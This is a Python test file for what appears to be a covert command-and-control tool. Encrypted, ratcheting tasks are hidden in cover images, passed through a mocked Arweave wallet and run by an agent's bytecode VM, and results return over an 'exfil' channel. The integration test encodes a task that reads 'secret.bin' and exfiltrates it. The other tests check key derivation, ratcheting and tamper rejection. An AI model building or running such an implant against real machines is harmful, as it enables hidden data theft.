from __future__ import annotations
import tempfile, os, argparse
from PIL import Image

from src.main import (
     run_server, 
     run_agent, 
     shared_state 
)

from src.crypto_wrapper import (
    encrypt_task,
    decrypt_task,
    derive_cmd_key,
)

from src.keys import (
    server_generate_k_root,
    server_derive_k_extract,
    server_derive_allkeys,
    server_save_server_keys,
    agent_save_agent_keys,
    server_load_server_keys,
    agent_load_agent_keys,
    advance_ratchet,
)

def test_full_loop_integration() -> None:
    with tempfile.TemporaryDirectory() as td:
        # 1) Paths you invent (just strings under td)
        server_keyfile = os.path.join(td, "server.json")
        agent_keyfile = os.path.join(td, "agent.json")
        cover_path = os.path.join(td, "cover.png")
        wallet_path = os.path.join(td, "wallet.json")
        secret_bin = os.path.join(td, "secret.bin")

        #Place a comment here later
        byte_val = b"LOL"
        with open(secret_bin, "wb") as f:
            f.write(byte_val)

        open(wallet_path, "w").write("{}")
        Image.new("RGB", (512, 512), (128, 128, 128)).save(cover_path)

        # Keys via keys.py — not hand-rolled hex
        k_root = server_generate_k_root()
        d = server_derive_allkeys(k_root)

        initial_task_ratchet = d["K_ratchet"]
        initial_exfil_ratchet = d["K_exfil_ratchet"]

        server_save_server_keys(
            server_keyfile,
            k_root,
            d["K_ratchet"],
            d["K_exfil_ratchet"],
            agent_wallet="agent_wallet",   # must match mock upload string in main.py
            last_seen_txid="",
        )
        agent_save_agent_keys(
            agent_keyfile,
            d["K_ratchet"],
            d["K_exfil_ratchet"],
            d["K_extract"],
            server_wallet="server_wallet",  # must match mock server wallet string
            last_seen_txid="",
            cover_path="",
        )

        exfil_task = (
            "PUSH32 0 PUSH32 1936024434 STORE32 "
            "PUSH32 4 PUSH32 1702112866 STORE32 "
            "PUSH32 8 PUSH32 1768816640 STORE32 "
            "PUSH32 0 SYSCALL 0 SYSCALL 6 HALT"
        )

        old_dir = os.getcwd()
        try:
            os.chdir(td)

            # Clear residual process state, then call main
            shared_state.clear()

            server_args = argparse.Namespace(
                keyfile=server_keyfile,
                cover=cover_path,
                wallet=wallet_path,
                mock=True,
                task=exfil_task,
                retrieve=None,
            )
            assert run_server(server_args) == 1, "server send should return 1"

            server_keys = server_load_server_keys(server_keyfile)

            assert server_keys["K_ratchet"] != initial_task_ratchet, (
                "after server send: task ratchet should advance"
            )
            assert server_keys["K_exfil_ratchet"] == initial_exfil_ratchet, (
                "after server send: exfil ratchet should not advance"
            )

            assert "mock" in shared_state, "after server send: mock Arweave missing from shared_state"
            assert "txid" in shared_state, "after server send: task txid missing from shared_state"

            agent_args = argparse.Namespace(
                keyfile=agent_keyfile,
                wallet=wallet_path,
                mock=True,
                bootstrap_url="mock://x",  # ignored in mock; uses shared_state["txid"]
                watch=False,
            )

            assert run_agent(agent_args) == 1, "agent bootstrap should return 1"

            agent_keys = agent_load_agent_keys(agent_keyfile)
            server_keys = server_load_server_keys(server_keyfile)

            assert agent_keys["K_ratchet"] != initial_task_ratchet, (
                "after agent bootstrap: task ratchet should advance"
            )
            assert agent_keys["K_ratchet"] == server_keys["K_ratchet"], (
                "after agent bootstrap: server and agent task ratchets should match"
            )
            assert agent_keys["K_exfil_ratchet"] != initial_exfil_ratchet, (
                "after agent bootstrap: agent exfil ratchet should advance"
            )
            assert server_keys["K_exfil_ratchet"] == initial_exfil_ratchet, (
                "after agent bootstrap: server exfil ratchet advances only on retrieve"
            )
            assert "K_root" not in agent_keys, (
                "agent key material must not include K_root"
            )

            # Server retrieve: pull agent exfil from mock wallet and advance K_exfil_ratchet
            retrieve_args = argparse.Namespace(
                keyfile=server_keyfile,
                wallet=wallet_path,
                mock=True,
                task=None,
                retrieve=True,
            )

            assert run_server(retrieve_args) == 1, "server retrieve should return 1"

            agent_keys = agent_load_agent_keys(agent_keyfile)
            server_keys = server_load_server_keys(server_keyfile)

            assert server_keys["K_exfil_ratchet"] != initial_exfil_ratchet, (
                "after server retrieve: server exfil ratchet should have advanced"
            )
            assert server_keys["K_exfil_ratchet"] == agent_keys["K_exfil_ratchet"], (
                "after server retrieve: server and agent exfil ratchets should match"
            )
            assert agent_keys["K_ratchet"] == server_keys["K_ratchet"], (
                "after server retrieve: task ratchets should still match"
            )

        finally:
            os.chdir(old_dir)

def test_keys_isolation() -> None:
    with tempfile.TemporaryDirectory() as td:
        # Temp keyfile paths and fixture wallet/txid strings
        server_keyfile = os.path.join(td, "server.json")
        agent_keyfile = os.path.join(td, "agent.json")

        agent_wallet = "AGENT_WALLET"
        last_seen_txid = "LAST_SEEN_TXID"
        cover_path = "COVER_PATH"

        # Generate server root and derive initial ratchets / K_extract
        k_root = server_generate_k_root()
        d = server_derive_allkeys(k_root)


        assert len(k_root) == 32, (
            "K_root must be 32 bytes"
        )
            
        
        # K_extract must match standalone derive from the same K_root


        assert d["K_extract"] == server_derive_k_extract(k_root), (
            "derived K_extract must match server_derive_k_extract(K_root)"
        )

        assert len(d["K_ratchet"]) == 32, (
            "K_ratchet must be 32 bytes"
        )

        assert len(d["K_exfil_ratchet"]) == 32, (
            "K_exfil_ratchet must be 32 bytes"
        )

        assert len(d["K_extract"]) == 32, (
            "K_extract must be 32 bytes"
        )

        # Derived keys must be distinct from each other and from K_root


        assert d["K_ratchet"] != d["K_exfil_ratchet"], (
            "task and exfil ratchets must differ"
        )

        assert d["K_ratchet"] != k_root, (
            "K_ratchet must not equal K_root"
        )

        assert d["K_exfil_ratchet"] != k_root, (
            "K_exfil_ratchet must not equal K_root"
        )

        # Persist server keys and reload from disk

        server_save_server_keys(
            keyfile_path=server_keyfile,
            K_root=k_root,
            K_ratchet=d["K_ratchet"],
            K_exfil_ratchet=d["K_exfil_ratchet"],
            agent_wallet=agent_wallet,
            last_seen_txid=last_seen_txid
        )

        server_keys = server_load_server_keys(server_keyfile)

        # Loaded server state must match what was saved

        assert server_keys["K_root"] == k_root, (
            "loaded K_root must match saved K_root"
        )

        assert server_keys["K_ratchet"] == d["K_ratchet"], (
            "loaded K_ratchet must match saved K_ratchet"
        )

        assert server_keys["K_exfil_ratchet"] == d["K_exfil_ratchet"], (
            "loaded K_exfil_ratchet must match saved K_exfil_ratchet"
        )

        assert server_keys["agent_wallet"] == agent_wallet, (
            "loaded agent_wallet must match saved agent_wallet"
        )

        assert server_keys["last_seen_txid"] == last_seen_txid, (
            "loaded last_seen_txid must match saved last_seen_txid"
        )

        # Persist agent keys (no K_root) and reload from disk
        # Fixture string agent_wallet is the agent's server_wallet field
        agent_save_agent_keys(
            keyfile_path=agent_keyfile,
            K_ratchet=d["K_ratchet"],
            K_exfil_ratchet=d["K_exfil_ratchet"],
            K_extract=d["K_extract"],
            server_wallet=agent_wallet,
            last_seen_txid=last_seen_txid,
            cover_path=cover_path,
        )

        agent_keys = agent_load_agent_keys(agent_keyfile)

        # Loaded agent state must match what was saved; K_root must be absent
        assert agent_keys["K_ratchet"] == d["K_ratchet"], (
            "loaded agent K_ratchet must match saved K_ratchet"
        )

        assert agent_keys["K_exfil_ratchet"] == d["K_exfil_ratchet"], (
            "loaded agent K_exfil_ratchet must match saved K_exfil_ratchet"
        )

        assert agent_keys["K_extract"] == d["K_extract"], (
            "loaded agent K_extract must match saved K_extract"
        )

        assert agent_keys["server_wallet"] == agent_wallet, (
            "loaded server_wallet must match saved server_wallet"
        )

        assert agent_keys["last_seen_txid"] == last_seen_txid, (
            "loaded agent last_seen_txid must match saved last_seen_txid"
        )

        assert agent_keys["cover_path"] == cover_path, (
            "loaded cover_path must match saved cover_path"
        )

        assert "K_root" not in agent_keys, (
            "agent key dict must not include K_root"
        )

        # advance_ratchet one-way and deterministic
        r1 = advance_ratchet(d["K_ratchet"])

        assert r1 != d["K_ratchet"], (
            "advance_ratchet must change the ratchet"
        )

        r2 = advance_ratchet(r1)

        assert r2 != r1, (
            "second advance must differ from first"
        )

        assert advance_ratchet(d["K_ratchet"]) == r1, (
            "advance_ratchet must be deterministic for the same input"
        )    

def test_crypto_roundtrip_and_tamper() -> None:
    # Round 1: clean encrypt → decrypt with the same ratchet
    k1 = os.urandom(32)
    pt1 = b"FIRST_TASK"

    payload_1, K1_After_Enc = encrypt_task(pt1, k1)
    result = decrypt_task(payload_1, k1)

    assert result is not None, (
        "decrypt of untampered payload must succeed"
    )

    pt1_out, k1_After_Dec = result

    # Plaintext recovered; both sides advanced the ratchet the same way
    assert pt1_out == pt1, (
        "decrypted plaintext must match original"
    )

    assert K1_After_Enc == k1_After_Dec, (
        "encrypt and decrypt must advance the ratchet to the same value"
    )

    assert k1 != K1_After_Enc, (
        "encrypt must advance the ratchet away from the input key"
    )

    assert k1 != k1_After_Dec, (
        "decrypt must advance the ratchet away from the input key"
    )

    # Round 2: flip payload bits → decrypt must fail closed
    k2 = os.urandom(32)
    pt2 = b"SECOND_TASK"

    payload_2, K2_After_Enc = encrypt_task(pt2, k2)

    # Invert every other byte so GCM auth tag / ciphertext is invalid
    mut = bytearray(payload_2)
    for i in range(0, len(mut), 2):
        mut[i] ^= 0xFF
    payload_3 = bytes(mut)

    # Tampered ciphertext must not decrypt
    payload_3_out = decrypt_task(payload_3, k2)

    assert payload_3_out is None, (
        "decrypt of tampered payload must return None"
    )

def test_stego_roundtrip() -> None:
    raise NotImplementedError


def test_arweave_mock_wallet_history() -> None:
    raise NotImplementedError


def test_vm_execute_and_wipe() -> None:
    raise NotImplementedError


def test_failure_wrong_k_extract() -> None:
    raise NotImplementedError


def test_failure_tampered_stego() -> None:
    raise NotImplementedError


def test_failure_oversized_bytecode() -> None:
    raise NotImplementedError


def test_failure_ratchet_desync() -> None:
    raise NotImplementedError


def test_failure_wrong_wallet() -> None:
    raise NotImplementedError


def test_failure_missing_cover() -> None:
    raise NotImplementedError


def test_security_backward_secrecy() -> None:
    raise NotImplementedError


def test_security_k_root_absent_from_agent_paths() -> None:
    raise NotImplementedError


def test_security_vm_wipe() -> None:
    raise NotImplementedError


def test_scenario_key_steal_detects() -> None:
    raise NotImplementedError


def test_scenario_key_corrupt_fail_closed() -> None:
    raise NotImplementedError


def test_scenario_rng_subversion_flags() -> None:
    raise NotImplementedError


def run_all() -> None:
    raise NotImplementedError


if __name__ == "__main__":
    test_full_loop_integration()
